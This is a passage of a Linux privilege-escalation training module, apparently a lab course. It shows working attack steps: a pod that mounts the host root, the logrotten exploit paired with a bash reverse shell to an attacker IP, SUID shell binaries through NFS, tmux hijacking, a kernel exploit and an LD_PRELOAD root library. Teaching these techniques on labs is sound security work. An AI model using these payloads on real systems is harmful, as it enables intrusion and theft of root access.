<p>Now that we have both the <code>token</code> and <code>certificate</code>, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.</p>
<p><strong>List Privileges</strong></p>
<p>Kubernetes</p>
<pre><code class="lang-shell-session">cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=<span class="hljs-variable">$token</span> --certificate-authority=ca<span class="hljs-selector-class">.crt</span> --server=https:<span class="hljs-comment">//10.129.10.11:6443 auth can-i --list</span>

Resources                                        Non-Resource URLs    Resource Names    Verbs 
selfsubjectaccessreviews<span class="hljs-selector-class">.authorization</span><span class="hljs-selector-class">.k8s</span><span class="hljs-selector-class">.io</span>        []                    []                [create]
selfsubjectrulesreviews<span class="hljs-selector-class">.authorization</span><span class="hljs-selector-class">.k8s</span><span class="hljs-selector-class">.io</span>        []                    []                [create]
pods                                            []                    []                [get create list]
..<span class="hljs-selector-class">.SNIP</span>...
</code></pre>
<p>Here we can see a few very important information. Besides the selfsubject-resources we can <code>get</code>, <code>create</code>, and <code>list</code> pods which are the resources representing the running container in the cluster. From here on, we can create a <code>YAML</code> file that we can use to create a new container and mount the entire root filesystem from the host system into this container&#39;s <code>/root</code> directory. From there on, we could access the host systems files and directories. The <code>YAML</code> file could look like following:</p>
<p><strong>Pod YAML</strong></p>
<p>Code: yaml</p>
<pre><code class="lang-yaml"><span class="hljs-attr">apiVersion:</span> v1
<span class="hljs-attr">kind:</span> Pod
<span class="hljs-attr">metadata:</span>
<span class="hljs-attr">  name:</span> privesc
<span class="hljs-attr">  namespace:</span> default
<span class="hljs-attr">spec:</span>
<span class="hljs-attr">  containers:</span>
<span class="hljs-attr">  - name:</span> privesc
<span class="hljs-attr">    image:</span> nginx:<span class="hljs-number">1.14</span><span class="hljs-number">.2</span>
<span class="hljs-attr">    volumeMounts:</span>
<span class="hljs-attr">    - mountPath:</span> /root
<span class="hljs-attr">      name:</span> mount-root-into-mnt
<span class="hljs-attr">  volumes:</span>
<span class="hljs-attr">  - name:</span> mount-root-into-mnt
<span class="hljs-attr">    hostPath:</span>
<span class="hljs-attr">       path:</span> /
<span class="hljs-attr">  automountServiceAccountToken:</span> <span class="hljs-literal">true</span>
<span class="hljs-attr">  hostNetwork:</span> <span class="hljs-literal">true</span>
</code></pre>
<p>Once created, we can now create the new pod and check if it is running as expected.</p>
<p><strong>Creating a new Pod</strong></p>
<pre><code class="lang-shell-session">cry0l1t3@k8:~$ kubectl --<span class="hljs-keyword">token</span>=<span class="hljs-variable">$token</span> --certificate-authority=<span class="hljs-keyword">ca</span>.crt --server=https:<span class="hljs-comment">//10.129.96.98:6443 apply -f privesc.yaml</span>

pod/privesc created


cry0l1t3@k8:~$ kubectl --<span class="hljs-keyword">token</span>=<span class="hljs-variable">$token</span> --certificate-authority=<span class="hljs-keyword">ca</span>.crt --server=https:<span class="hljs-comment">//10.129.96.98:6443 get pods</span>

NAME    READY    STATUS    RESTARTS    AGE
nginx    1/1        Running    0            23m
privesc    1/1        Running    0            12s
</code></pre>
<p>If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.</p>
<p><strong>Extracting Root&#39;s SSH Key</strong></p>
<pre><code class="lang-shell-session">cry0l1t3@k8<span class="hljs-symbol">:~</span>$ kubeletctl --server <span class="hljs-number">10.129</span>.<span class="hljs-number">10.11</span> exec <span class="hljs-string">"cat /root/root/.ssh/id_rsa"</span> -p privesc -c privesc

-----<span class="hljs-keyword">BEGIN</span> OPENSSH PRIVATE KEY-----
...SNIP...
</code></pre>
<h2 id="logrotate">Logrotate</h2>
<hr>
<p>Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called <code>logrotate</code> takes care of archiving or disposing of old logs. If no attention is paid to log files, they become larger and larger and eventually occupy all available disk space. Furthermore, searching through many large log files is time-consuming. To prevent this and save disk space, <code>logrotate</code> has been developed. The logs in <code>/var/log</code> give administrators the information they need to determine the cause behind malfunctions. Almost more important are the unnoticed system details, such as whether all services are running correctly.</p>
<p><code>Logrotate</code> has many features for managing these log files. These include the specification of:</p>
<ul>
<li>the <code>size</code> of the log file,</li>
<li>its <code>age</code>,</li>
<li>and the <code>action</code> to be taken when one of these factors is reached.</li>
</ul>
<p>Logrotate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ man logrotate
root@htb[/htb]$ # or
root@htb[/htb]$ logrotate --help

Usage: logrotate [OPTION...] &lt;configfile&gt;
  -<span class="ruby">d, --debug               Don<span class="hljs-string">'t do anything, just test and print debug messages
</span></span>  -<span class="ruby"><span class="hljs-string">f, --force               Force file rotation
</span></span>  -<span class="ruby"><span class="hljs-string">m, --mail=command        Command to send mail (instead of '</span>/usr/bin/mail<span class="hljs-string">')
</span></span>  -<span class="ruby"><span class="hljs-string">s, --state=statefile     Path of state file
</span></span>      -<span class="ruby"><span class="hljs-string">-skip-state-lock     Do not lock the state file
</span></span>  -<span class="ruby"><span class="hljs-string">v, --verbose             Display messages during rotation
</span></span>  -<span class="ruby"><span class="hljs-string">l, --log=logfile         Log file or '</span>syslog<span class="hljs-string">' to log to syslog
</span></span>      -<span class="ruby"><span class="hljs-string">-version             Display version information
</span></span>
Help options:
  -<span class="ruby"><span class="hljs-string">?, --help                Show this help message
</span></span>      -<span class="ruby"><span class="hljs-string">-usage               Display brief usage message</span></span>
</code></pre>
<p>The function of the rotation itself consists in renaming the log files. For example, new log files can be created for each new day, and the older ones will be renamed automatically. Another example of this would be to empty the oldest log file and thus reduce memory consumption.</p>
<p>This tool is usually started periodically via <code>cron</code> and controlled via the configuration file <code>/etc/logrotate.conf</code>. Within this file, it contains global settings that determine the function of <code>logrotate</code>.</p>
<p>Logrotate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">cat</span> /etc/logrotate.<span class="hljs-keyword">conf</span>


# see <span class="hljs-string">"man logrotate"</span> <span class="hljs-keyword">for</span> details

# <span class="hljs-keyword">global</span> options <span class="hljs-keyword">do</span> not affect preceding <span class="hljs-keyword">include</span> directives

# <span class="hljs-keyword">rotate</span> <span class="hljs-keyword">log</span> files <span class="hljs-built_in">weekly</span>
<span class="hljs-built_in">weekly</span>

# <span class="hljs-keyword">use</span> the adm group <span class="hljs-keyword">by</span> default, since this is the owning <span class="hljs-built_in">group</span>
# of /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/syslog.
<span class="hljs-keyword">su</span> root adm

# <span class="hljs-keyword">keep</span> 4 weeks worth of backlogs
<span class="hljs-keyword">rotate</span> 4

# create new (empty) <span class="hljs-keyword">log</span> files after rotating old ones
create

# <span class="hljs-keyword">use</span> date <span class="hljs-keyword">as</span> a suffix of the rotated <span class="hljs-keyword">file</span>
#dateext

# uncomment this <span class="hljs-keyword">if</span> you want your <span class="hljs-keyword">log</span> files compressed
#<span class="hljs-keyword">compress</span>

# packages <span class="hljs-keyword">drop</span> <span class="hljs-keyword">log</span> rotation information into this directory
<span class="hljs-keyword">include</span> /etc/logrotate.<span class="hljs-built_in">d</span>

# system-specific logs may also be configured here.
</code></pre>
<p>To force a new rotation on the same day, we can set the date after the individual log files in the status file <code>/var/lib/logrotate.status</code> or use the <code>-f</code>/<code>--force</code> option:</p>
<p>Logrotate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo <span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/lib/logrotate.status

/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/samba/<span class="hljs-keyword">log</span>.smbd" 2022-8-3
/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/mysql/mysql.<span class="hljs-keyword">log</span>" 2022-8-3
</code></pre>
<p>We can find the corresponding configuration files in <code>/etc/logrotate.d/</code> directory.</p>
<p>Logrotate</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ ls /etc</span><span class="hljs-regexp">/logrotate.d/</span>

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
</code></pre>
<p>Logrotate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">cat</span> /etc/logrotate.<span class="hljs-keyword">d</span>/dpkg

/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/dpkg.<span class="hljs-keyword">log</span> {
        <span class="hljs-built_in">monthly</span>
        <span class="hljs-keyword">rotate</span> 12
        <span class="hljs-keyword">compress</span>
        delaycompress
        missingok
        notifempty
        create 644 root root
}
</code></pre>
<p>To exploit <code>logrotate</code>, we need some requirements that we have to fulfill.</p>
<ol>
<li>we need <code>write</code> permissions on the log files</li>
<li>logrotate must run as a privileged user or <code>root</code></li>
<li>vulnerable versions:<ul>
<li>3.8.6</li>
<li>3.11.0</li>
<li>3.15.0</li>
<li>3.18.0</li>
</ul>
</li>
</ol>
<p>There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named <a href="https://github.com/whotwagner/logrotten">logrotten</a>. We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.</p>
<p>Logrotate</p>
<pre><code class="lang-shell-session">logger<span class="hljs-meta">@nix</span><span class="hljs-number">02:</span>~$ git clone <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/whotwagner/logrotten.git</span>
logger<span class="hljs-meta">@nix</span><span class="hljs-number">02:</span>~$ cd logrotten
logger<span class="hljs-meta">@nix</span><span class="hljs-number">02:</span>~$ gcc logrotten.c -o logrotten
</code></pre>
<p>Next, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the <code>IP</code> and <code>port</code> of our VM that we use to attack the target system.</p>
<p>Logrotate</p>
<pre><code class="lang-shell-session">logger<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">'bash -i &gt;&amp; /dev/tcp/10.10.14.2/9001 0&gt;&amp;1'</span> &gt; payload
</code></pre>
<p>However, before running the exploit, we need to determine which option <code>logrotate</code> uses in <code>logrotate.conf</code>.</p>
<p>Logrotate</p>
<pre><code class="lang-shell-session">logger<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>grep <span class="hljs-string">"create\|compress"</span> /etc/logrotate.conf | grep -v <span class="hljs-string">"#"</span>

create
</code></pre>
<p>In our case, it is the option: <code>create</code>. Therefore we have to use the exploit adapted to this function.</p>
<p>After that, we have to start a listener on our VM / Pwnbox, which waits for the target system&#39;s connection.</p>
<p>Logrotate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nlvp <span class="hljs-number">9001</span>

Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-number">9001</span>
</code></pre>
<p>As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.</p>
<p>Logrotate</p>
<pre><code class="lang-shell-session">logger<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./logrotten -p ./payload /tmp/tmp.log
</code></pre>
<p>Logrotate</p>
<pre><code class="lang-shell-session">...
Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-number">9001</span>

Connection received on <span class="hljs-number">10.129</span><span class="hljs-number">.24</span><span class="hljs-number">.11</span> <span class="hljs-number">49818</span>
# id

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
</code></pre>
<h2 id="miscellaneous-techniques">Miscellaneous Techniques</h2>
<hr>
<h3 id="passive-traffic-capture">Passive Traffic Capture</h3>
<p>If <code>tcpdump</code> is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as <a href="https://github.com/DanMcInerney/net-creds">net-creds</a> and <a href="https://github.com/lgandx/PCredz">PCredz</a> that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.</p>
<hr>
<h3 id="weak-nfs-privileges">Weak NFS Privileges</h3>
<p>Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command <code>showmount -e</code>, which lists the NFS server&#39;s export list (or the access control list for filesystems) that NFS clients.</p>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ showmount -e <span class="hljs-number">10.129</span><span class="hljs-number">.2</span><span class="hljs-number">.12</span>

Export <span class="hljs-keyword">list</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.2</span><span class="hljs-number">.12</span>:
/tmp             *
/<span class="hljs-keyword">var</span>/nfs/general *
</code></pre>
<p>When an NFS volume is created, various options can be set:</p>
<table>
<thead>
<tr>
<th>Option</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>root_squash</code></td>
<td>If the root user is used to access NFS shares, it will be changed to the <code>nfsnobody</code> user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the <code>nfsnobody</code> user, which prevents an attacker from uploading binaries with the SUID bit set.</td>
</tr>
<tr>
<td><code>no_root_squash</code></td>
<td>Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.</td>
</tr>
</tbody>
</table>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">htb@NIX02:~$ cat /etc/exports

<span class="hljs-meta"># /etc/exports: the access control list for filesystems which may be exported</span>
<span class="hljs-meta">#        to NFS clients.  See exports(5).</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta"># Example for NFSv2 and NFSv3:</span>
<span class="hljs-meta"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta"># Example for NFSv4:</span>
<span class="hljs-meta"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span>
<span class="hljs-meta"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span>
<span class="hljs-meta">#</span>
/<span class="hljs-keyword">var</span>/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
</code></pre>
<p>For example, we can create a SETUID binary that executes <code>/bin/sh</code> using our local root user. We can then mount the <code>/tmp</code> directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.</p>
<p>First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.</p>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">htb<span class="hljs-symbol">@NIX02</span>:~$ cat shell.c 

<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-built_in">int</span> main(void)
{
  setuid(<span class="hljs-number">0</span>)<span class="hljs-comment">; setgid(0); system("/bin/bash");</span>
}
</code></pre>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">htb<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>gcc shell.c -o shell
</code></pre>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@Pwnbox</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo mount -t nfs <span class="hljs-number">10.129</span>.<span class="hljs-number">2.12</span><span class="hljs-symbol">:/tmp</span> /mnt
root<span class="hljs-variable">@Pwnbox</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cp shell /mnt
root<span class="hljs-variable">@Pwnbox</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>chmod u+s /mnt/shell
</code></pre>
<p>When we switch back to the host&#39;s low privileged session, we can execute the binary and obtain a root shell.</p>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">htb@NIX02:/tmp$  ls -la

total 68
drwxrwxrwt<span class="hljs-number"> 10 </span>root  root  <span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 1 </span>06:15 .
drwxr-xr-x<span class="hljs-number"> 24 </span>root  root  <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 31 </span>02:24 ..
drwxrwxrwt <span class="hljs-number"> 2 </span>root  root  <span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 1 </span>05:35 .font-unix
drwxrwxrwt <span class="hljs-number"> 2 </span>root  root  <span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 1 </span>05:35 .ICE-unix
-rwsr-xr-x <span class="hljs-number"> 1 </span>root  root <span class="hljs-number"> 16712 </span>Sep <span class="hljs-number"> 1 </span>06:15 shell
&lt;SNIP&gt;
</code></pre>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">htb@<span class="hljs-symbol">NIX02</span>:/tmp$ ./shell
root@<span class="hljs-symbol">NIX02</span>:/tmp<span class="hljs-attr"># id

uid=0</span><span class="hljs-comment">(root)</span> gid=<span class="hljs-number">0</span><span class="hljs-comment">(root)</span> groups=<span class="hljs-number">0</span><span class="hljs-comment">(root)</span>,<span class="hljs-number">4</span><span class="hljs-comment">(adm)</span>,<span class="hljs-number">24</span><span class="hljs-comment">(cdrom)</span>,<span class="hljs-number">27</span><span class="hljs-comment">(sudo)</span>,<span class="hljs-number">30</span><span class="hljs-comment">(dip)</span>,<span class="hljs-number">46</span><span class="hljs-comment">(plugdev)</span>,<span class="hljs-number">110</span><span class="hljs-comment">(lxd)</span>,<span class="hljs-number">115</span><span class="hljs-comment">(lpadmin)</span>,<span class="hljs-number">116</span><span class="hljs-comment">(sambashare)</span>,<span class="hljs-number">1000</span><span class="hljs-comment">(htb)</span>
</code></pre>
<hr>
<h3 id="hijacking-tmux-sessions">Hijacking Tmux Sessions</h3>
<p>Terminal multiplexers such as <a href="https://en.wikipedia.org/wiki/Tmux">tmux</a> can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a <code>tmux</code> window, we can detach from the session, still leaving it active (i.e., running an <code>nmap</code> scan). For many reasons, a user may leave a <code>tmux</code> process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.</p>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">htb<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>tmux -S /shareds new -s debugsess
htb<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>chown <span class="hljs-symbol">root:</span>devs /shareds
</code></pre>
<p>If we can compromise a user in the <code>dev</code> group, we can attach to this session and gain root access.</p>
<p>Check for any running <code>tmux</code> processes.</p>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">htb<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span> ps aux | grep tmux

root      <span class="hljs-number">4806</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">1</span>  <span class="hljs-number">29416</span>  <span class="hljs-number">3204</span> ?        Ss   <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">27</span>   <span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> tmux -S /shareds new -s debugsess
</code></pre>
<p>Confirm permissions.</p>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">htb<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls -la /shareds 

srw-rw---- <span class="hljs-number">1</span> root devs <span class="hljs-number">0</span> Sep  <span class="hljs-number">1</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">27</span> /shareds
</code></pre>
<p>Review our group membership.</p>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">htb@<span class="hljs-symbol">NIX02</span>:~$ id

uid=<span class="hljs-number">1000</span><span class="hljs-comment">(htb)</span> gid=<span class="hljs-number">1000</span><span class="hljs-comment">(htb)</span> groups=<span class="hljs-number">1000</span><span class="hljs-comment">(htb)</span>,<span class="hljs-number">1011</span><span class="hljs-comment">(devs)</span>
</code></pre>
<p>Finally, attach to the <code>tmux</code> session and confirm root privileges.</p>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">htb@<span class="hljs-symbol">NIX02</span>:~$ tmux -S /shareds

id

uid=<span class="hljs-number">0</span><span class="hljs-comment">(root)</span> gid=<span class="hljs-number">0</span><span class="hljs-comment">(root)</span> groups=<span class="hljs-number">0</span><span class="hljs-comment">(root)</span>
</code></pre>
<h2 id="kernel-exploits">Kernel Exploits</h2>
<hr>
<p>Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is <a href="https://github.com/dirtycow/dirtycow.github.io">Dirty COW</a> (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root privileges. It is very common to find systems that are vulnerable to kernel exploits. It can be hard to keep track of legacy systems, and they may be excluded from patching due to compatibility issues with certain services or applications.</p>
<p>Privilege escalation using a kernel exploit can be as simple as downloading, compiling, and running it. Some of these exploits work out of the box, while others require modification. A quick way to identify exploits is to issue the command <code>uname -a</code> and search Google for the kernel version.</p>
<p>Note: Kernel exploits can cause system instability so use caution when running these against a production system.</p>
<hr>
<h3 id="kernel-exploit-example">Kernel Exploit Example</h3>
<p>Let&#39;s start by checking the Kernel level and Linux OS version.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ uname -<span class="hljs-selector-tag">a</span>

Linux NIX02 <span class="hljs-number">4.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">116</span>-generic <span class="hljs-number">#140</span>-Ubuntu SMP Mon Feb <span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">23</span>:<span class="hljs-number">04</span> UTC <span class="hljs-number">2018</span> x86_64 x86_64 x86_64 GNU/Linux
</code></pre>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=<span class="hljs-number">16.04</span>
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION=<span class="hljs-string">"Ubuntu 16.04.4 LTS"</span>
</code></pre>
<p>We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for <code>linux 4.4.0-116-generic exploit</code> comes up with <a href="https://vulners.com/zdt/1337DAY-ID-30003">this</a> exploit PoC. Next download, it to the system using <code>wget</code> or another file transfer method. We can compile the exploit code using <a href="https://linux.die.net/man/1/gcc">gcc</a> and set the executable bit using <code>chmod +x</code>.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ gcc kernel_exploit.c -o kernel_exploit &amp;&amp; chmod +x kernel_exploit
</code></pre>
<p>Next, we run the exploit and hopefully get dropped into a root shell.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ ./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
</code></pre>
<p>Finally, we can confirm root access to the box.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]<span class="hljs-meta"># whoami</span>

root
</code></pre>
<p>{% hint style=&quot;info&quot; %}
<strong>Note</strong>: The target system has been updated, but is still vulnerable. Use a kernel exploit created in 2021.
{% endhint %}</p>
<h2 id="shared-libraries">Shared Libraries</h2>
<hr>
<p>It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: <code>static libraries</code> (denoted by the .a file extension) and <code>dynamically linked shared object libraries</code> (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.</p>
<p>There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the <code>-rpath</code> or <code>-rpath-link</code> flags when compiling a program, using the environmental variables <code>LD_RUN_PATH</code> or <code>LD_LIBRARY_PATH</code>, placing libraries in the <code>/lib</code> or <code>/usr/lib</code> default directories, or specifying another directory containing the libraries within the <code>/etc/ld.so.conf</code> configuration file.</p>
<p>Additionally, the <code>LD_PRELOAD</code> environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the <code>ldd</code> utility.</p>
<p>Shared Libraries</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ ldd /bin/ls

    linux-vdso<span class="hljs-selector-class">.so</span>.<span class="hljs-number">1</span> =&gt;  (<span class="hljs-number">0</span>x00007fff03bc7000)
    libselinux<span class="hljs-selector-class">.so</span>.<span class="hljs-number">1</span> =&gt; /lib/x86_64-linux-gnu/libselinux<span class="hljs-selector-class">.so</span>.<span class="hljs-number">1</span> (<span class="hljs-number">0</span>x00007f4186288000)
    libc<span class="hljs-selector-class">.so</span>.<span class="hljs-number">6</span> =&gt; /lib/x86_64-linux-gnu/libc<span class="hljs-selector-class">.so</span>.<span class="hljs-number">6</span> (<span class="hljs-number">0</span>x00007f4185ebe000)
    libpcre<span class="hljs-selector-class">.so</span>.<span class="hljs-number">3</span> =&gt; /lib/x86_64-linux-gnu/libpcre<span class="hljs-selector-class">.so</span>.<span class="hljs-number">3</span> (<span class="hljs-number">0</span>x00007f4185c4e000)
    libdl<span class="hljs-selector-class">.so</span>.<span class="hljs-number">2</span> =&gt; /lib/x86_64-linux-gnu/libdl<span class="hljs-selector-class">.so</span>.<span class="hljs-number">2</span> (<span class="hljs-number">0</span>x00007f4185a4a000)
    /lib64/ld-linux-x86-<span class="hljs-number">64</span><span class="hljs-selector-class">.so</span>.<span class="hljs-number">2</span> (<span class="hljs-number">0</span>x00007f41864aa000)
    libpthread<span class="hljs-selector-class">.so</span>.<span class="hljs-number">0</span> =&gt; /lib/x86_64-linux-gnu/libpthread<span class="hljs-selector-class">.so</span>.<span class="hljs-number">0</span> (<span class="hljs-number">0</span>x00007f418582d000)
</code></pre>
<p>The image above lists all the libraries required by <code>/bin/ls</code>, along with their absolute paths.</p>
<hr>
<h3 id="ld-_preload-privilege-escalation">LD_PRELOAD Privilege Escalation</h3>
<p>Let&#39;s see an example of how we can utilize the <a href="https://blog.fpmurphy.com/2012/09/all-about-ld\_preload.html">LD_PRELOAD</a> environment variable to escalate privileges. For this, we need a user with <code>sudo</code> privileges.</p>
<p>Shared Libraries</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l

Matching Defaults entries <span class="hljs-keyword">for</span> daniel.carter on <span class="hljs-symbol">NIX02:</span>
    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on <span class="hljs-symbol">NIX02:</span>
    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/sbin/apache2 restart
</code></pre>
<p>This user has rights to restart the Apache service as root, but since this is <code>NOT</code> a <a href="https://gtfobins.github.io/#apache">GTFOBin</a> and the <code>/etc/sudoers</code> entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the <code>LD_PRELOAD</code> issue to run a custom shared library file. Let&#39;s compile the following library:</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>

void _init() {
unsetenv(<span class="hljs-string">"LD_PRELOAD"</span>)<span class="hljs-comment">;</span>
setgid(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
setuid(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
system(<span class="hljs-string">"/bin/bash"</span>)<span class="hljs-comment">;</span>
}
</code></pre>
<p>We can compile this as follows:</p>
<p>Shared Libraries</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ gcc -fPIC -shared -o root<span class="hljs-selector-class">.so</span> root<span class="hljs-selector-class">.c</span> -nostartfiles
</code></pre>
<p>Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.</p>
<p>Shared Libraries</p>
